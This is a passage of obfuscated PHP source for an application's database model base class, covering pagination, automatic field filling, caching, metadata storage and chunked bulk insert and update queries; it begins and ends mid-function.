$ÅÚÓÌËç = array(); $ÅÚÓÌËç[$ŸÈ­Û£Õ[428]] = $İú¿×ÂÍ; $İú¿×ÂÍ = $ÅÚÓÌËç; } if (isset($this->options[$ŸÈ­Û£Õ[354]])) { $this->options[$ŸÈ­Û£Õ[354]] = array_merge($this->options[$ŸÈ­Û£Õ[354]], $İú¿×ÂÍ); } else { $this->options[$ŸÈ­Û£Õ[354]] = $İú¿×ÂÍ; } return $this; } public function limit($“ÃíµÓŸ, $ğÓöœ… = null) { $Ÿ¸ØÛŞ =& $_SERVER[¿ÈˆÑ¸ä]; $this->options[$Ÿ¸ØÛŞ[369]] = is_null($ğÓöœ…) ? $“ÃíµÓŸ : $“ÃíµÓŸ . $Ÿ¸ØÛŞ[50] . $ğÓöœ…; return $this; } public function page($üÄÕ­Ï¢, $áİ¼¼³æ = null) { $ÉéŠİ™ç =& $_SERVER[¿ÈˆÑ¸ä]; $this->options[$ÉéŠİ™ç[429]] = is_null($áİ¼¼³æ) ? $üÄÕ­Ï¢ : $üÄÕ­Ï¢ . $ÉéŠİ™ç[50] . $áİ¼¼³æ; return $this; } public function comment($¤šÓ•ªŞ) { $this->options[$_SERVER[¿ÈˆÑ¸ä][430]] = $¤šÓ•ªŞ; return $this; } public function setProperty($´ø˜˜Ôà, $»ŠåÔä¾) { if (property_exists($this, $´ø˜˜Ôà)) { $this->{$´ø˜˜Ôà} = $»ŠåÔä¾; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\151\155\145", "\164\151\x6d\145", "\x69\x6e\163\145\x72\164\54\165\160\144\141\164\x65", "\x66\165\156\x63\x74\x69\157\156"), array("\143\162\x65\x61\x74\x65\x54\151\155\x65", "\x74\x69\155\x65", "\x69\x6e\x73\x65\x72\x74", "\146\165\x6e\x63\164\x69\157\x6e")); public function setDataAuto($‚°—Ï’à) { $this->dataAuto = $‚°—Ï’à; } public function __construct($ü¯å€Ò = '', $Ÿá´Ô¼ó = '', $Çá¿êú = '') { parent::__construct($ü¯å€Ò, $Ÿá´Ô¼ó, $Çá¿êú); } protected $tableMeta = array(); protected function _beforeInsert(&$ğ’•øùÄ, $İ®ÖâÅ¡) { $Ÿ˜ô¾Ğ• =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->checkDataAutoHas($Ÿ˜ô¾Ğ•[431])) { return; } $this->dataBeforeFilter($ğ’•øùÄ, $Ÿ˜ô¾Ğ•[431]); } protected function _beforeUpdate(&$ÁãŞ¬¸º, $Û·®á×÷) { $Ö×Ğ×Æ› =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->checkDataAutoHas($Ö×Ğ×Æ›[432])) { return; } $this->dataBeforeFilter($ÁãŞ¬¸º, $Ö×Ğ×Æ›[432]); } protected function _afterSelect(&$ÆÒÃéŞØ, $é¾¯±ïÍ) { if (!is_array($ÆÒÃéŞØ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿ÈˆÑ¸ä][433])) { return; } foreach ($ÆÒÃéŞØ as &$”â¼—Ö´) { $this->dataAfterFilter($”â¼—Ö´); } unset($”â¼—Ö´); } protected function _afterFind(&$´€“”å, $½ëÍÒë) { if (!is_array($´€“”å)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿ÈˆÑ¸ä][433])) { return; } $this->dataAfterFilter($´€“”å); } public static function textEncode($¿õÚôç÷) { if (!$¿õÚôç÷) { return $¿õÚôç÷; } $øæÖ©À¼ = json_encode($¿õÚôç÷); $øæÖ©À¼ = preg_replace_callback($_SERVER[¿ÈˆÑ¸ä][434], function ($´íƒ´¤ú) { return addslashes($´íƒ´¤ú[0]); }, $øæÖ©À¼); return json_decode($øæÖ©À¼); } public static function textDecode($ ¨‘­Ïï) { $Â‰É–õÄ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ ¨‘­Ïï) { return $ ¨‘­Ïï; } $˜—ÊûÓ = json_encode($ ¨‘­Ïï); $˜—ÊûÓ = preg_replace_callback($Â‰É–õÄ[435], function ($‰Úæ½¿) { return $_SERVER[¿ÈˆÑ¸ä][98]; }, $˜—ÊûÓ); return json_decode($˜—ÊûÓ); } public function setAutoIncrement($áõ¾½ì©) { $°ìğë– = array($this->getPk() => $áõ¾½ì©); $ãı©øŞ = $this->data($°ìğë–)->add(); if ($ãı©øŞ) { $this->delete($ãı©øŞ); } } public function getAutoIncrement() { $„ï…•äö = $this->getTableName(); $¼òµ±İİ = $this->max($this->getPk()); $‘Û‡ÊÛÄ = $this->query("\x73\150\157\167\x20\164\141\x62\x6c\145\40\163\164\141\x74\165\163\x20\167\x68\145\162\145\x20\x4e\x61\155\145\x3d\x27{$„ï…•äö}\x27"); $‹´½Â½­ = $‘Û‡ÊÛÄ[0][$_SERVER[¿ÈˆÑ¸ä][436]]; $®ªşç£û = max($¼òµ±İİ, $‹´½Â½­); return $®ªşç£û; } protected function _callBefore($´ŠÊúû, $«˜»ä™æ) { return $this->cacheCallCheck($´ŠÊúû, $«˜»ä™æ, !1); } protected function _callAfter($…ä—¢ê, $³óŒà†·) { return $this->cacheCallCheck($…ä—¢ê, $³óŒà†·, !0); } protected function cacheFunctionAlias($Úıà—†») { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($óãó°Œ«, $¯²œøôá, $Î²­çåˆ = false) { $¼£¥ú”ì =& $_SERVER[¿ÈˆÑ¸ä]; $áÒ™â¬¼ = $this->cacheFunctionAlias($¯²œøôá); if (!$áÒ™â¬¼) { return; } foreach ($áÒ™â¬¼ as $ü‡ƒãæÆ => $ÅÑ±ÜÜå) { $™äé›€ = $ÅÑ±ÜÜå[0]; $„ŸÅ‘Ã = explode($¼£¥ú”ì[50], $ÅÑ±ÜÜå[1]); $ıÔİ«« = isset($ÅÑ±ÜÜå[2]) ? $ÅÑ±ÜÜå[2] : $¼£¥ú”ì[12]; if ($óãó°Œ« == $ü‡ƒãæÆ) { return $this->cacheFunctionGet($ü‡ƒãæÆ, $™äé›€, $ıÔİ««); } if ($Î²­çåˆ && in_array($óãó°Œ«, $„ŸÅ‘Ã)) { $this->cacheFunctionClear($ü‡ƒãæÆ, $™äé›€, $ıÔİ««); } } } public function cacheFunctionGet($ÂùÖÑš, $ï²É¾û¬, $Šé¶Û¸ = '') { $Õ¥åã°“ =& $_SERVER[¿ÈˆÑ¸ä]; $€Èêó±ş = $this->cacheKeyMake($ÂùÖÑš, $ï²É¾û¬, $Šé¶Û¸); $ãâ´Ê ¯ = Cache::get($€Èêó±ş); if (!is_array($ãâ´Ê ¯)) { if (method_exists($this, $Õ¥åã°“[342] . $ÂùÖÑš)) { $ÂùÖÑš = $Õ¥åã°“[342] . $ÂùÖÑš; } $ãâ´Ê ¯ = call_user_func_array(array($this, $ÂùÖÑš), array($ï²É¾û¬, !0)); Cache::set($€Èêó±ş, $ãâ´Ê ¯); } return $ãâ´Ê ¯; } public function cacheFunctionClear($öœ»”•, $à¬ÂÛ«ã, $»ìéòÛª = '') { $«ß÷‰ªÛ = $à¬ÂÛ«ã; if (!is_array($à¬ÂÛ«ã)) { $«ß÷‰ªÛ = array($à¬ÂÛ«ã); } foreach ($«ß÷‰ªÛ as $²à–«ê¼) { $‡ó³Ÿˆ = $this->cacheKeyMake($öœ»”•, $²à–«ê¼, $»ìéòÛª); Cache::remove($‡ó³Ÿˆ); } } public function cacheKeyMake($©—Ò„‘›, $Â—ûìíû, $Îß±Ö¹õ) { $Ò‹£à»Õ =& $_SERVER[¿ÈˆÑ¸ä]; if ($Îß±Ö¹õ) { $Â—ûìíû = $Â—ûìíû . $Ò‹£à»Õ[437] . $Îß±Ö¹õ; } return get_class($this) . $Ò‹£à»Õ[11] . $©—Ò„‘› . $Ò‹£à»Õ[438] . $Â—ûìíû; } protected function selectPageReset() { $ùÄ¦ßÀº =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($GLOBALS[$ùÄ¦ßÀº[439]])) { return; } $GLOBALS[$ùÄ¦ßÀº[439]] = isset($GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[440]]) ? $GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[440]] : !1; $GLOBALS[$ùÄ¦ßÀº[441]] = isset($GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[429]]) ? $GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[429]] : !1; $GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[440]] = !1; $GLOBALS[$ùÄ¦ßÀº[7]][$ùÄ¦ßÀº[429]] = !1; } protected function selectPageRestore() { $±ì‘à†á =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($GLOBALS[$±ì‘à†á[439]])) { return; } $GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[440]] = $GLOBALS[$±ì‘à†á[439]]; $GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[429]] = $GLOBALS[$±ì‘à†á[441]]; if ($GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[440]] === !1) { unset($GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[440]]); } if ($GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[429]] === !1) { unset($GLOBALS[$±ì‘à†á[7]][$±ì‘à†á[429]]); } unset($GLOBALS[$±ì‘à†á[439]]); unset($GLOBALS[$±ì‘à†á[441]]); } protected function selectPage($Ÿõ›™ÄÇ = 200, $’§ÛŞ’Ğ = 1) { $…è±Òæñ =& $_SERVER[¿ÈˆÑ¸ä]; global $in; $ù‚™Îš‚ = $this->optionsValue(); $€¤°íé´ = 50000; $Ÿõ›™ÄÇ = isset($in[$…è±Òæñ[440]]) && $in[$…è±Òæñ[440]] ? $in[$…è±Òæñ[440]] : $Ÿõ›™ÄÇ; if ($Ÿõ›™ÄÇ === -1) { $in[$…è±Òæñ[440]] = !1; $€¤°íé´ = 100000000; $Ÿõ›™ÄÇ = $€¤°íé´; } $—èè¨® = $ù‚™Îš‚; $—èè¨®[$…è±Òæñ[442]] = array(); $Ÿõ›™ÄÇ = intval($Ÿõ›™ÄÇ); $Ÿõ›™ÄÇ = $Ÿõ›™ÄÇ <= 5 ? 5 : ($Ÿõ›™ÄÇ >= $€¤°íé´ ? $€¤°íé´ : $Ÿõ›™ÄÇ); $’§ÛŞ’Ğ = intval(isset($in[$…è±Òæñ[429]]) && $in[$…è±Òæñ[429]] ? $in[$…è±Òæñ[429]] : $’§ÛŞ’Ğ); $’§ÛŞ’Ğ = $’§ÛŞ’Ğ <= 1 ? 1 : $’§ÛŞ’Ğ; $óÂÑîş± = array(); $åŸ‹úş• = 1; if ($’§ÛŞ’Ğ == 1 && $åŸ‹úş•) { $this->optionsValue($ù‚™Îš‚); $óÂÑîş± = $this->page($’§ÛŞ’Ğ, $Ÿõ›™ÄÇ)->select(); $æ¦ñàÖ¥ = is_array($óÂÑîş±) ? count($óÂÑîş±) : 0; if ($æ¦ñàÖ¥ < $Ÿõ›™ÄÇ) { $§µŞÅü± = 1; } else { $this->optionsValue($—èè¨®); $æ¦ñàÖ¥ = intval($this->count()); $§µŞÅü± = ceil($æ¦ñàÖ¥ / $Ÿõ›™ÄÇ); } } else { $this->optionsValue($—èè¨®); $æ¦ñàÖ¥ = intval($this->count()); $§µŞÅü± = ceil($æ¦ñàÖ¥ / $Ÿõ›™ÄÇ); $’§ÛŞ’Ğ = $’§ÛŞ’Ğ >= $§µŞÅü± ? $§µŞÅü± : $’§ÛŞ’Ğ; $this->optionsValue($ù‚™Îš‚); $óÂÑîş± = $this->page($’§ÛŞ’Ğ, $Ÿõ›™ÄÇ)->select(); } if (!is_array($óÂÑîş±)) { $óÂÑîş± = array(); } if ($§µŞÅü± == 1) { $æ¦ñàÖ¥ = count($óÂÑîş±); } $¯ìˆâø = array($…è±Òæñ[443] => array($…è±Òæñ[444] => $æ¦ñàÖ¥, $…è±Òæñ[440] => $Ÿõ›™ÄÇ, $…è±Òæñ[429] => $’§ÛŞ’Ğ, $…è±Òæñ[445] => $§µŞÅü±), $…è±Òæñ[446] => $óÂÑîş±); return $¯ìˆâø; } protected function checkLength($°Ïå„óé, $‘¸üÛÃ» = 0, $ĞîÂ‚Áƒ = '') { $ß©çŞØù =& $_SERVER[¿ÈˆÑ¸ä]; $‘¸üÛÃ» = $‘¸üÛÃ» ? $‘¸üÛÃ» : 65536; if (!$°Ïå„óé || strlen($°Ïå„óé) < $‘¸üÛÃ») { return; } $ĞîÂ‚Áƒ = $ĞîÂ‚Áƒ ? $ĞîÂ‚Áƒ . $ß©çŞØù[74] : $ß©çŞØù[12]; show_json($ĞîÂ‚Áƒ . LNG($ß©çŞØù[447]) . "\x28{$‘¸üÛÃ»}\x29", !1); } protected function metaSet($†ÀàÙˆ, $Æò™ñ“˜ = null, $ÇÔœÍÁ = null) { $¥®¯½ª  =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->tableMeta || !$†ÀàÙˆ) { return !1; } $ÖÛÎÀÄ÷ = $this->tableMeta[$¥®¯½ª [448]]; $›­–ÈâÄ = $this->tableMeta[$¥®¯½ª [449]]; $ƒßÔîâ = Model($›­–ÈâÄ); $ê™‚¾ªØ = array($ÖÛÎÀÄ÷ => $†ÀàÙˆ, $¥®¯½ª [450] => $Æò™ñ“˜); if (is_null($Æò™ñ“˜)) { return $ƒßÔîâ->where(array($ÖÛÎÀÄ÷ => $†ÀàÙˆ))->delete(); } if (is_null($ÇÔœÍÁ) && is_string($Æò™ñ“˜)) { return $ƒßÔîâ->where($ê™‚¾ªØ)->delete(); } $áêÎ€å‰ = is_array($Æò™ñ“˜) ? $Æò™ñ“˜ : array(); if (is_string($Æò™ñ“˜)) { $áêÎ€å‰[$Æò™ñ“˜] = $ÇÔœÍÁ; } $½‘ªÎÁ = array(); foreach ($áêÎ€å‰ as $ÜúÏ³Û => $†ñ‰Î£) { if (is_null($†ñ‰Î£) && is_string($ÜúÏ³Û)) { $ƒßÔîâ->where(array($ÖÛÎÀÄ÷ => $†ÀàÙˆ, $¥®¯½ª [450] => $ÜúÏ³Û))->delete(); continue; } $this->checkLength($†ñ‰Î£, !1, $›­–ÈâÄ . $¥®¯½ª [4] . $ÜúÏ³Û); $½‘ªÎÁ[] = array($ÖÛÎÀÄ÷ => $†ÀàÙˆ, $¥®¯½ª [95] => $ÜúÏ³Û, $¥®¯½ª [451] => $†ñ‰Î£); } $¶¢©¶ù = $¥®¯½ª [452] . $›­–ÈâÄ; CacheLock::lock($¶¢©¶ù); $ƒßÔîâ->where(array($ÖÛÎÀÄ÷ => $†ÀàÙˆ))->addAll($½‘ªÎÁ, array(), !0); CacheLock::unlock($¶¢©¶ù); return !0; } public function metaGet($ªĞÍ¶µ¸, $«•¬©² = false) { $Á÷áÍÃ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->tableMeta) { return array(); } $Óğ¨™üŠ = $this->tableMeta[$Á÷áÍÃ[448]]; $¥¬æÖß = Model($this->tableMeta[$Á÷áÍÃ[449]]); if ($«•¬©²) { $¼åöÇâê = array($Óğ¨™üŠ => $ªĞÍ¶µ¸, $Á÷áÍÃ[95] => $«•¬©²); return $¥¬æÖß->where($¼åöÇâê)->getField($Á÷áÍÃ[451]); } $¼åöÇâê = array($Óğ¨™üŠ => $ªĞÍ¶µ¸); $ÓÈŞÃø± = $¥¬æÖß->field($Á÷áÍÃ[453])->where($¼åöÇâê)->select(); $ÓÈŞÃø± = array_to_keyvalue($ÓÈŞÃø±, $Á÷áÍÃ[95], $Á÷áÍÃ[451]); return $ÓÈŞÃø±; } private function checkDataAutoHas($ƒ¿ñ«ó¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $«ò£ûÜœ) { if (in_array($ƒ¿ñ«ó¤, explode($_SERVER[¿ÈˆÑ¸ä][50], $«ò£ûÜœ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$®¨Œğ, $Ãğ¶Á­) { $ÒòÃ÷è =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($®¨Œğ)) { return; } foreach ($this->dataAuto as $ïŒŒôŞÌ) { $³òøÓâÎ = $ïŒŒôŞÌ[0]; if (!in_array($Ãğ¶Á­, explode($ÒòÃ÷è[50], $ïŒŒôŞÌ[2]))) { continue; } switch (trim($ïŒŒôŞÌ[3])) { case $ÒòÃ÷è[397]: case $ÒòÃ÷è[398]: $¦š½âÂ¾ = $ïŒŒôŞÌ[1]; $§ˆÁ¨áµ = isset($ïŒŒôŞÌ[4]) ? (array) $ïŒŒôŞÌ[4] : array(); if ($¦š½âÂ¾ == $ÒòÃ÷è[205] && array_key_exists($³òøÓâÎ, $®¨Œğ)) { if (!$®¨Œğ[$³òøÓâÎ]) { unset($®¨Œğ[$³òøÓâÎ]); } break; } if (isset($®¨Œğ[$³òøÓâÎ])) { array_unshift($§ˆÁ¨áµ, $®¨Œğ[$³òøÓâÎ]); } if ($ÒòÃ÷è[397] == $ïŒŒôŞÌ[3]) { $®¨Œğ[$³òøÓâÎ] = call_user_func_array($¦š½âÂ¾, $§ˆÁ¨áµ); } else { $®¨Œğ[$³òøÓâÎ] = call_user_func_array(array(&$this, $¦š½âÂ¾), $§ˆÁ¨áµ); } break; case $ÒòÃ÷è[349]: if (isset($®¨Œğ[$³òøÓâÎ]) && $®¨Œğ[$³òøÓâÎ]) { $®¨Œğ[$³òøÓâÎ] = call_user_func_array(array(&$this, $ïŒŒôŞÌ[1]), array($®¨Œğ[$³òøÓâÎ])); } break; case $ÒòÃ÷è[352]: $®¨Œğ[$³òøÓâÎ] = $®¨Œğ[$ïŒŒôŞÌ[1]]; break; case $ÒòÃ÷è[370]: if (isset($®¨Œğ[$³òøÓâÎ]) && !is_string($®¨Œğ[$³òøÓâÎ])) { $®¨Œğ[$³òøÓâÎ] = json_encode_force($®¨Œğ[$³òøÓâÎ]); $®¨Œğ[$³òøÓâÎ] = self::textEncode($®¨Œğ[$³òøÓâÎ]); } break; case $ÒòÃ÷è[399]: if ($®¨Œğ[$³òøÓâÎ] === $ÒòÃ÷è[12]) { unset($®¨Œğ[$³òøÓâÎ]); } break; case $ÒòÃ÷è[400]: $®¨Œğ[$³òøÓâÎ] = $ïŒŒôŞÌ[1]; default: break; } } if ($Ãğ¶Á­ == $ÒòÃ÷è[431]) { $¡š§ ¥Ö = strtolower($this->db->getDbType()); if (strpos($¡š§ ¥Ö, $ÒòÃ÷è[13]) !== 0) { return; } $§¡ÏüŸõ = $this->field(!0)->fields; $éÏÃ˜Ñã = $§¡ÏüŸõ[$ÒòÃ÷è[330]]; if (isset($§¡ÏüŸõ[$ÒòÃ÷è[329]])) { unset($éÏÃ˜Ñã[$§¡ÏüŸõ[$ÒòÃ÷è[329]]]); } foreach ($éÏÃ˜Ñã as $£Íò³Õö => $Ãğ¶Á­) { if (!isset($®¨Œğ[$£Íò³Õö])) { $®¨Œğ[$£Íò³Õö] = $ÒòÃ÷è[12]; } } } } private function dataAfterFilter(&$ÈÙùİŞÈ) { $ÉãÅ×Şà =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($this->dataAuto as $Ûˆîş€) { $²¼½òö = $Ûˆîş€[0]; if (!isset($ÈÙùİŞÈ[$²¼½òö])) { continue; } if (!in_array($ÉãÅ×Şà[433], explode($ÉãÅ×Şà[50], $Ûˆîş€[2]))) { continue; } switch (trim($Ûˆîş€[3])) { case $ÉãÅ×Şà[397]: case $ÉãÅ×Şà[398]: $’µ¦¨İ£ = isset($Ûˆîş€[4]) ? (array) $Ûˆîş€[4] : array(); array_unshift($’µ¦¨İ£, $ÈÙùİŞÈ[$²¼½òö]); if (isset($Ûˆîş€[4]) && $Ûˆîş€[4] == $ÉãÅ×Şà[454]) { $’µ¦¨İ£ = array($ÈÙùİŞÈ[$²¼½òö]); } if ($ÉãÅ×Şà[397] == $Ûˆîş€[3]) { $ÈÙùİŞÈ[$²¼½òö] = call_user_func_array($Ûˆîş€[1], $’µ¦¨İ£); } else { $ÈÙùİŞÈ[$²¼½òö] = call_user_func_array(array(&$this, $Ûˆîş€[1]), $’µ¦¨İ£); } break; case $ÉãÅ×Şà[349]: if (isset($ÈÙùİŞÈ[$²¼½òö]) && $ÈÙùİŞÈ[$²¼½òö]) { $ÈÙùİŞÈ[$²¼½òö] = call_user_func_array(array(&$this, $Ûˆîş€[1]), array($ÈÙùİŞÈ[$²¼½òö])); } break; case $ÉãÅ×Şà[352]: $ÈÙùİŞÈ[$²¼½òö] = $ÈÙùİŞÈ[$Ûˆîş€[1]]; break; case $ÉãÅ×Şà[370]: $å¤Ò£ŠŒ = $ÈÙùİŞÈ[$²¼½òö]; $å¤Ò£ŠŒ = self::textDecode($å¤Ò£ŠŒ); $ÈÙùİŞÈ[$²¼½òö] = json_decode($å¤Ò£ŠŒ, !0); if (is_null($ÈÙùİŞÈ[$²¼½òö])) { $ÈÙùİŞÈ[$²¼½òö] = $å¤Ò£ŠŒ; } break; case $ÉãÅ×Şà[399]: if ($ÈÙùİŞÈ[$²¼½òö] === $ÉãÅ×Şà[12]) { unset($ÈÙùİŞÈ[$²¼½òö]); } break; case $ÉãÅ×Şà[400]: $ÈÙùİŞÈ[$²¼½òö] = $Ûˆîş€[1]; break; default: break; } } } public function saveAll($ÆºøÚ£Î, $æêŞ¼”’ = false) { $ŠŸ²‹éı =& $_SERVER[¿ÈˆÑ¸ä]; $Ê±Ş›¡« = $this->db; $Šº‚æì = $this->tablePrefix . $this->tableName; $É‡ÆŒûÃ = $this->saveAllChunkMake($ÆºøÚ£Î); $æêŞ¼”’ = is_array($æêŞ¼”’) ? $æêŞ¼”’ : array(); foreach ($É‡ÆŒûÃ as $à„Ê¹ù«) { $À”ÄæÚó = $ŠŸ²‹éı[12]; $¯–âşïÙ = $ŠŸ²‹éı[12]; $×‚½ç‰Ì = array(); $ƒ‚ä¸±² = array(); foreach ($à„Ê¹ù« as $˜Èã‹Ú¿ => $ö‡İôöÅ) { $À”ÄæÚó = $ö‡İôöÅ[$ŠŸ²‹éı[455]]; $ƒ‚ä¸±²[] = $ö‡İôöÅ[$ŠŸ²‹éı[456]]; $¹å•É™¹ = $Ê±Ş›¡«->parseValue($ö‡İôöÅ[$ŠŸ²‹éı[456]]); foreach ($ö‡İôöÅ[$ŠŸ²‹éı[457]] as $íÔ‡¨” => $„­ò»Õ¬) { if (!$×‚½ç‰Ì[$íÔ‡¨”]) { $×‚½ç‰Ì[$íÔ‡¨”] = array(); } $×‚½ç‰Ì[$íÔ‡¨”][] = $ŠŸ²‹éı[458] . $¹å•É™¹ . $ŠŸ²‹éı[459] . $Ê±Ş›¡«->parseValue($„­ò»Õ¬); } } $°¦ÛÙ—ä = $À”ÄæÚó; $°¦ÛÙ—ä = $Ê±Ş›¡«->parseKey($°¦ÛÙ—ä); foreach ($×‚½ç‰Ì as $íÔ‡¨” => $âü”) { $¯–âşïÙ .= $ŠŸ²‹éı[286] . $Ê±Ş›¡«->parseKey($íÔ‡¨”) . $ŠŸ²‹éı[460] . $°¦ÛÙ—ä . $ŠŸ²‹éı[461]; $¯–âşïÙ .= implode($ŠŸ²‹éı[286], $âü”) . $ŠŸ²‹éı[462]; } $ÎÑ÷Ë = $æêŞ¼”’; $ÎÑ÷Ë[$À”ÄæÚó] = array($ŠŸ²‹éı[7], $ƒ‚ä¸±²); $şÏ×‚Ì¦ = "\x55\120\104\x41\x54\105\x20\x60{$Šº‚æì}\x60\40\123\x45\124\x20" . rtrim($¯–âşïÙ, $ŠŸ²‹éı[50]) . $ŠŸ²‹éı[286] . $Ê±Ş›¡«->parseWhere($ÎÑ÷Ë); $this->execute($şÏ×‚Ì¦); $this->chunkEventCheck(count($à„Ê¹ù«)); } $this->chunkEventSet(); } public function saveAllEach($ÌÙª†–, $¬úãî£é = false) { $è§Âç³ =& $_SERVER[¿ÈˆÑ¸ä]; $¤¶¶ñıì = $this->db; $øóúÎ“Ø = $this->tablePrefix . $this->tableName; $ååá“ÚÃ = $this->saveAllChunkMake($ÌÙª†–); $¬úãî£é = is_array($¬úãî£é) ? $¬úãî£é : array(); foreach ($ååá“ÚÃ as $‚ØŸí”) { foreach ($‚ØŸí” as $à¤ŞõğÜ => $øô×Ê¹³) { $º•¬ÌÎë = $è§Âç³[463]; foreach ($øô×Ê¹³[$è§Âç³[457]] as $äÏ†™ú¼ => $·æ¿ğ€Ò) { $º•¬ÌÎë .= $¤¶¶ñıì->parseKey($äÏ†™ú¼) . $è§Âç³[464] . $¤¶¶ñıì->parseValue($·æ¿ğ€Ò) . $è§Âç³[50]; } $ ¥‘öå÷ = $¬úãî£é; $ ¥‘öå÷[$øô×Ê¹³[$è§Âç³[455]]] = $øô×Ê¹³[$è§Âç³[456]]; $Ô¬·âí = "\125\120\x44\x41\124\x45\x20\140{$øóúÎ“Ø}\140\40\123\x45\x54\x20" . rtrim($º•¬ÌÎë, $è§Âç³[50]) . $è§Âç³[465] . $¤¶¶ñıì->parseWhere($ ¥‘öå÷) . $è§Âç³[466]; $this->execute($Ô¬·âí); } $this->chunkEventCheck(count($‚ØŸí”)); } $this->chunkEventSet(); } private function saveAllChunkMake($Ï¿ÙÀ™) { $­¸…“ÊŸ =& $_SERVER[¿ÈˆÑ¸ä]; $·ĞµùŸ = self::SQL_WHERE_IN_CHUNK; $Ï¿ÙÀ™ = is_array($Ï¿ÙÀ™) ? $Ï¿ÙÀ™ : array(); $ö¥ûáËÃ = array(); $–×ÊŒÖ‰ = ceil(count($Ï¿ÙÀ™) / $·ĞµùŸ); for ($çüø£ = 0; $çüø£ < $–×ÊŒÖ‰; $çüø£++) { $êË®üëŠ = array(); $Ï›¼ß©ƒ = array_slice($Ï¿ÙÀ™, $çüø£ * $·ĞµùŸ, $·ĞµùŸ); foreach ($Ï›¼ß©ƒ as $„†¡âıì) { if (!is_array($„†¡âıì) || count($„†¡âıì) < 4 || count($„†¡âıì) % 2 != 0) { continue; } $ßÇ§ÎÁ‘ = array(); for ($ÃşíŸ‹æ = 2; $ÃşíŸ‹æ < count($„†¡âıì); $ÃşíŸ‹æ += 2) { $ßÇ§ÎÁ‘[$„†¡âıì[$ÃşíŸ‹æ]] = $„†¡âıì[$ÃşíŸ‹æ + 1]; } $êË®üëŠ[] = array($­¸…“ÊŸ[455] => $„†¡âıì[0], $­¸…“ÊŸ[456] => $„†¡âıì[1], $­¸…“ÊŸ[457] => $ßÇ§ÎÁ‘); } $ö¥ûáËÃ[] = $êË®üëŠ; } return $ö¥ûáËÃ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ØÛ‡ô = false, $„¶‹©¯ = false) { $this->_chunkEvent = $ØÛ‡ô; $this->_chunkEventParam = $„¶‹©¯; } private function chunkEventCheck($¶ü±È™Ğ) { if (!$this->_chunkEvent) { return; } $˜áöàÙÖ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $˜áöàÙÖ[$_SERVER[¿ÈˆÑ¸ä][467]] = $¶ü±È™Ğ; Hook::trigger($this->_chunkEvent, $˜áöàÙÖ); } public function addAll($íÕÖĞßç, $ËÓ¹ü¾ï = array(), $ €…–Ë = false) { $ùª†üÒÊ =& $_SERVER[¿ÈˆÑ¸ä]; ignore_timeout(); $§ú©æ†ğ = self::SQL_WHERE_IN_CHUNK; if (empty($íÕÖĞßç)) { $this->error = think_lang($ùª†üÒÊ[350]); return !1; } $ËÓ¹ü¾ï = $this->_parseOptions($ËÓ¹ü¾ï); foreach ($íÕÖĞßç as $å«ÏºÆ => $‡éäÅ…) { $íÕÖĞßç[$å«ÏºÆ] = $this->_facade($‡éäÅ…); $this->_beforeInsert($íÕÖĞßç[$å«ÏºÆ], $ËÓ¹ü¾ï); } if (method_exists($this->db, $ùª†üÒÊ[351])) { for ($ïÎ…è™‚ = 0; $ïÎ…è™‚ < count($íÕÖĞßç); $ïÎ…è™‚ += $§ú©æ†ğ) { $Òœ×îì– = array_slice($íÕÖĞßç, $ïÎ…è™‚, $§ú©æ†ğ); if (!is_array($Òœ×îì–) || count($Òœ×îì–) == 0) { break; } $–°ï…ÃÃ = $this->db->insertAll($Òœ×îì–, $ËÓ¹ü¾ï, $ €…–Ë); $this->chunkEventCheck(count($Òœ×îì–)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($íÕÖĞßç as $å«ÏºÆ => $‡éäÅ…) { $–°ï…ÃÃ = $this->db->insert($‡éäÅ…, $ËÓ¹ü¾ï, $ €…–Ë); } $this->commit(); } if (!1 !== $–°ï…ÃÃ) { $½ÕÎ•Œ = $this->getLastInsID(); if ($½ÕÎ•Œ) { return $½ÕÎ•Œ; } } return $–°ï…ÃÃ; } public function save($Ô‰¹ï§İ = '', $ÕÖåÌµÈ = array()) { $úî„©õ¦ =& $_SERVER[¿ÈˆÑ¸ä]; $¦ÉßØ = self::SQL_WHERE_IN_CHUNK; $ìÄ¨«ò = $this->optionsValue(); $³ùëßå¹ = $this->findWhereField($ìÄ¨«ò); if (!$³ùëßå¹) { return parent::save($Ô‰¹ï§İ, $ÕÖåÌµÈ); } $Ç½—ú– = 0; $ˆ ğ§Áş = $ìÄ¨«ò[$úî„©õ¦[354]][$³ùëßå¹][1]; $ˆ ğ§Áş = is_array($ˆ ğ§Áş) ? $ˆ ğ§Áş : array(); $ÙËê’é = count($ˆ ğ§Áş); for ($â€õÁ™ = 0; $â€õÁ™ < $ÙËê’é; $â€õÁ™ += $¦ÉßØ) { $Ì¦ÓêØÈ = array_slice($ˆ ğ§Áş, $â€õÁ™, $¦ÉßØ); if (!is_array($Ì¦ÓêØÈ) || count($Ì¦ÓêØÈ) == 0) { break; } 